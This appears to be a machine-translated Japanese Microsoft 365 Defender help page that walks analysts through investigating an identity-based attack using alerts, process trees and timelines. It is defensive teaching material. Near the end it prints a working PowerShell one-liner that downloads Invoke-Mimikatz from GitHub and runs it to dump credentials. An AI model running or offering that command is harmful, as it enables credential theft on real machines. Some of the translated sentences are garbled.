---
title: ID ベースの攻撃の例
description: ID ベースの攻撃の分析例を説明します。
keywords: インシデント、アラート、調査、相関関係、攻撃、コンピューター、デバイス、ユーザー、ID、メールボックス、電子メール、365、microsoft、m365、インシデント対応、サイバー攻撃
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 6d62e1127eabb401a6af77aa1bbf073e4cfced17
ms.sourcegitcommit: a4729532278de62f80f2160825d446f6ecd36995
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 03/31/2022
ms.locfileid: "64570109"
---
# <a name="example-of-an-identity-based-attack"></a>ID ベースの攻撃の例

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**適用対象:**
- Microsoft 365 Defender

Microsoft Defender for Identity組織の ID を侵害する悪意のある試みを検出するのに役立ちます。 Defender for Identity は Microsoft 365 Defender と統合され、セキュリティ アナリストは、Netlogon 特権昇格の疑いなど、Defender for Identity から入ってくる脅威を可視化できます。

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>ネットワークでの攻撃のMicrosoft Defender for Identity

Microsoft 365 Defender分析者は、[インシデント] ページの [アラート] タブで検出ソースによってアラートをフィルター処理できます。 次の例では、検出ソースは Defender for **Identity にフィルター処理されます**。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="フィルター処理で検出ソースをMicrosoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

[疑わしいオーバーパス-**the ハッシュ** 攻撃] アラートを選択すると、詳細な情報を表示する Microsoft Defender for Cloud Appsページに移動します。 [このアラートの種類の詳細] を選択して、攻撃と修復の提案の説明を読み取[](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002)り、アラートまたは攻撃の詳細をいつでも確認できます。
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="疑わしいオーバーパス・ザ・ハッシュ攻撃アラート" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>同じ攻撃を調査Microsoft Defender for Endpoint

または、分析者は Defender for Endpoint を使用して、エンドポイントでのアクティビティの詳細を確認できます。 インシデント キューからインシデントを選択し、[アラート] タブ **を選択** します。ここから、検出ソースも識別できます。 検出ソースは、エンドポイントEDR検出と応答の略です。これは Defender for Endpoint です。 ここからアナリストは、ユーザーが検出したアラートをEDR。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="エンドポイントの検出と応答 (Microsoft Defender for Endpoint ポータル)" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

アラート ページには、影響を受けたデバイス名、ユーザー名、自動調査の状態、アラートの詳細など、さまざまな関連情報が表示されます。 アラート ストーリーは、プロセス ツリーの視覚的な表現を示しています。 プロセス ツリーは、アラートに関連する親プロセスと子プロセスの階層的な表現です。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="メッセージ内のアラート プロセス ツリー Microsoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

各プロセスを展開して、詳細を表示できます。 アナリストに表示される詳細は、悪意のあるスクリプト、送信接続 IP アドレス、その他の有用な情報の一部として入力された実際のコマンドです。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="ポータルのプロセスのMicrosoft Defender for Endpoint" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
[タイムラインで **表示] を選択** すると、アナリストはさらにドリルダウンして、侵害の正確な時刻を判断できます。 

Microsoft Defender for Endpoint、悪意のあるファイルやスクリプトが多数検出される可能性があります。 ただし、送信接続、PowerShell、およびコマンド ライン アクティビティの正当な使用が多いため、悪意のあるファイルまたはアクティビティが作成されるまで、一部のアクティビティは良性と見なされます。 そのため、タイムラインを使用すると、アナリストはアラートを周囲のアクティビティと関連付け、一般的なファイル システムとユーザー アクティビティによって見えなされない攻撃の元のソースまたは時間を特定できます。 

タイムラインを使用するには、アナリストはアラート検出時 (赤) から開始し、悪意のあるアクティビティに導かれた元のアクティビティが実際にいつ開始されたのか判断するために、時間内に後方にスクロールします。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="アナリストによるアラート検出の開始時刻" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Windows Update 接続、Windows 信頼済みソフトウェアライセンス認証トラフィック、Microsoft サイトへのその他の一般的な接続、サードパーティのインターネットアクティビティ、Microsoft Endpoint Configuration Manager アクティビティ、その他の良性アクティビティなどの一般的なアクティビティを疑わしいアクティビティと理解して区別することが重要です。アクティビティ。 区別する方法の 1 つは、タイムライン フィルターを使用する方法です。 アナリストが表示したくない項目をフィルター処理しながら、特定のアクティビティを強調表示できるフィルターが多数存在します。 

次の図では、アナリストがフィルター処理して、ネットワーク イベントとプロセス イベントのみを表示しました。 このフィルター条件を使用すると、アナリストは、メモ帳 が IP アドレスとの接続を確立したイベントを取り巻くネットワーク接続とプロセスを確認できます。これは、プロセス ツリーでも見ていました。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="悪意メモ帳送信接続を確立するために使用された方法" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

この特定のイベントでは、悪意メモ帳送信接続を確立するために使用されたイベントです。 ただし、通常、iexplorer.exeプロセスは通常、Web ブラウザーの通常のアクティビティと見なiexplorer.exeを使用して悪意のあるペイロードをダウンロードする接続を確立します。

タイムラインで探すもう 1 つの項目は、PowerShell が送信接続に使用する場合です。 アナリストは、悪意のあるファイルをホストする Web サイトへの送信接続などのコマンドを使用して、PowerShell `IEX (New-Object Net.Webclient)` 接続の成功を探します。 

次の例では、PowerShell を使用して Web サイトから Mimikatz をダウンロードして実行しました。

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
アナリストは、検索バーにキーワードを入力して、PowerShell で作成されたイベントのみを表示することで、キーワードをすばやく検索できます。 

## <a name="next-step"></a>次の手順

フィッシング調査 [パスを](first-incident-path-phishing.md) 参照してください。

## <a name="see-also"></a>関連項目

- [インシデントの概要](incidents-overview.md)
- [インシデントの管理](manage-incidents.md)
- [インシデントの調査](investigate-incidents.md)
